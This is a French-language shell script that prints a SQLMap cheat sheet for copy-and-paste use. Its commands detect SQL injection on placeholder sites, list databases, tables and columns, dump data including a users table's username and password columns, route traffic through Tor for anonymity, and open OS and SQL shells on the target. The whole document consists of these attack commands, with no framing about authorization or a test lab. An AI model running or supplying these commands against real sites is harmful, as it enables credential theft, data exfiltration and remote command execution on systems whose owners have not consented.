

"## SQLMap Cheat Sheet pour Console"

 "\n### Commandes Automatiques"

echo -e "\n#### Scanner une URL de manière automatique"
echo "sqlmap -u \"http://siteatester.fr\""

echo -e "\n#### Scanner une URL avec un paramètre GET"
echo "sqlmap -u \"http://siteatester.fr?id=1\""

echo -e "\n#### Scanner une URL avec des paramètres POST"
echo "sqlmap -u \"http://siteatester.fr\" --data=\"PARAMETRE1=VALEUR1&PARAMETRE2=VALEUR2\""

echo -e "\n### Préciser les Paramètres"

echo -e "\n#### Préciser le paramètre sur lequel réaliser l’injection"
echo "sqlmap -u \"http://siteatester.fr?param1=valueur1&param2=valueur2\" -p param1"

echo -e "\n#### Préciser le type de base de données (mysql)"
echo "sqlmap -u \"http://siteatester.fr\" --dbms=mysql"

echo -e "\n### Listage"

echo -e "\n#### Lister les bases de données"
echo "sqlmap -u \"http://siteatester.fr?id=1\" --dbs"

echo -e "\n#### Lister les tables d’une base spécifique"
echo "sqlmap -u \"http://siteatester.fr\" -D \"nom_de_la_database\" --tables"

echo -e "\n#### Lister les colonnes d’une table spécifique"
echo "sqlmap -u \"http://siteatester.fr\" -D \"nom_de_la_database\" -T \"nom_de_la_table\" --columns"

echo -e "\n### Dump"

echo -e "\n#### Dump tout ce qu’SQLMap trouve"
echo "sqlmap -u \"http://siteatester.fr\" --dump"

echo -e "\n#### Dump une base de données spécifique"
echo "sqlmap -u \"http://siteatester.fr\" -D \"nom_de_la_database\" --dump"

echo -e "\n#### Dump une table spécifique"
echo "sqlmap -u \"http://siteatester.fr\" -D \"nom_de_la_database\" -T \"nom_de_la_table\" --dump"

echo -e "\n#### Dump seulement des colonnes spécifiques d’une table"
echo "sqlmap -u \"http://testsite.com/login.php\" -D site_db -T users -C username,password --dump"

echo -e "\n### Cookies"

echo -e "\n#### Utiliser des cookies dans la requête"
echo "sqlmap -u \"http://siteatester.fr\" --cookie=\"COOKIE1=VALEUR1;COOKIE2=VALEUR2\""

echo -e "\n### Proxy"

echo -e "\n#### Passer le trafic de SQLMap via un proxy"
echo "sqlmap -u \"http://siteatester.fr\" --proxy=http://proxy:port"

echo -e "\n#### Passer le trafic de SQLMap via Tor"
echo "sqlmap -u \"http://siteatester.fr\" --tor --tor-type=SOCKS5 --check-tor"

echo -e "\n### Reverse Shell"

echo -e "\n#### Obtenir un reverse shell OS"
echo "sqlmap -u \"http://siteatester.fr\" --os-shell"

echo -e "\n#### Obtenir un shell SQL"
echo "sqlmap -u \"http://siteatester.fr\" --sql-shell"

echo -e "\n### Autres Commandes Utiles"
# Ici vous pouvez continuer avec les autres commandes utiles que vous souhaitez ajouter

# Notez que cette approche simplifie la copie et le collage des commandes directement depuis la console.
